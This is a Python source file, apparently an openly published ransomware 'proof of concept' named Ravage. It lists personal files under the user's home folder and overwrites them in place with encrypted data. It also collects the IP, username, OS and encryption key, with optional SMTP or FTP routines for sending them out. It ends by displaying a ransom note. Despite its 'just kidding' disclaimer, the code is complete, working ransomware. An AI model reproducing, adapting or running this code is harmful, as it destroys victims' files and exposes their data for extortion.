#!/usr/bin/env python
#Author: Intrackeable
#Github: https://github.com/intrackeable

import os, ftplib, smtplib, platform, random
from datetime import datetime
from os import path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

try:
    import requests, pyfiglet
    from progress.bar import ChargingBar
    from cryptography.fernet import Fernet
    from colorama import Fore, Style

except ImportError:
    print('Use pip install -r requirements.txt')
    exit()

#COLOR
R = Fore.LIGHTRED_EX + Style.NORMAL
E = Fore.LIGHTRED_EX + Style.BRIGHT

def Discover_Files():

    victimlist = open('victims','w+')
    home = os.environ['HOME']
    folders = os.listdir(home)
    folders = [x for x in folders if not x.startswith('.')] #Eliminate hide folders in linux systems

    extensions = ['.jpg', '.jpeg', '.gif', '.png', '.svg', '.psd',
                  '.mp3', '.mp4', '.wav', '.avi', '.pdf', '.docx',
                  '.rar', '.tar', '.txt', '.csv', '.doc', '.xls',
                  '.xlsx', '.ppt', '.pptx', '.raw', '.zip']

    for u in folders:
        mainpath = home + '/' + u
        for ext in extensions:
            for mainfolder, dirs, files in os.walk(mainpath):
                for file in files:
                    if file.endswith(ext):
                        victimlist.write(os.path.join(mainfolder, file) + '\n')
    victimlist.close()

def Generate_Key():
    secretkey = Fernet.generate_key()
    return secretkey

def Generate_Random_ID():
    idnumber = random.randint(100000000000000,999999999999999999999999999999)
    return idnumber
    
def Encrypt_File(key,filename):

    f = Fernet(key)

    with open(filename,'rb') as file: 
        file_content = file.read() #Read file with binary mode
        file.close()

    encrypted_data = f.encrypt(file_content) #Encrypt all content

    with open(filename, 'wb') as file:

        file.write(encrypted_data) #open again and replace with encrypted data
        file.close()
    
def Encrypt_File_List(key):

    with open('victims','r') as victimspaths:
        pathlist = victimspaths.read().split('\n')
        pathlist = [x for x in pathlist if not x == ''] #Eliminate empty elements
        victimspaths.close()
    
    bar = ChargingBar(E + '[ENCRYPTING FILES]', max=100)
    for i in pathlist:
        try:
            Encrypt_File(key,i)
            bar.next()
        except KeyboardInterrupt:
            continue
    bar.finish()

def Send_To_Server(key,idnumber):

    enableftp = False #Enable this to select sending mode
    enablesmtp = False

    ip = requests.get('https://api.ipify.org').text
    user = os.getlogin()
    op = platform.system()
    datenow = datetime.now()

    data = 'IP: {} \nUser: {} \nKey: {} \nDate: {} \nOperating System: {} \nID: {} \n'.format(ip,user,key,datenow,op,idnumber)
    file = open(user,'w')
    file.write(data)
    file.close()

    if enableftp == True:

        Send_FTP(key,user)

    elif enablesmtp == True:

        Send_SMTP(data)

def Send_SMTP(data):

    msj = MIMEMultipart()
    password = 'password' #Set email and password here
    msj['From'] = 'email'
    msj['To'] = 'email'
    msj['Subject'] = 'INFECTED'

    msj.attach(MIMEText(data, 'plain'))
    try:
        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(msj['From'], password)
        server.sendmail(msj['From'], msj['To'], msj.as_string())
        server.quit()
    except:
        print(R + 'SMTP CONNECTION ERROR')
    
def Send_FTP(key,user):

    file = open(user,'rb')
    try:
        ftp = ftplib.FTP('ip','user','password') #Set host, username and password here
        ftp.storbinary('STOR victim.txt', file)
        ftp.quit()
    except:
        print(R + 'FTP CONNECTION ERROR')
    file.close()

def Display_Message(idnumber):
        info = '''
Hello, all your personal files were locked using AES
encryption, the only way to recover them is with a key.
Send an email to ransonware@protonmail.com adding
the identification, and follow the instructions.

[Just kidding, this is a proof of concept.]

[ID: {}]

'''.format(idnumber)

        os.system('clear')
        logo = pyfiglet.figlet_format('Ravage',font='slant')
        print(E + logo)
        print(R + info)

def main():
    victims = Discover_Files()
    idnumber = Generate_Random_ID()
    key = Generate_Key()
    Encrypt_File_List(key)
    Send_To_Server(key,idnumber)
    Display_Message(idnumber)

if __name__ == '__main__':
    main()
    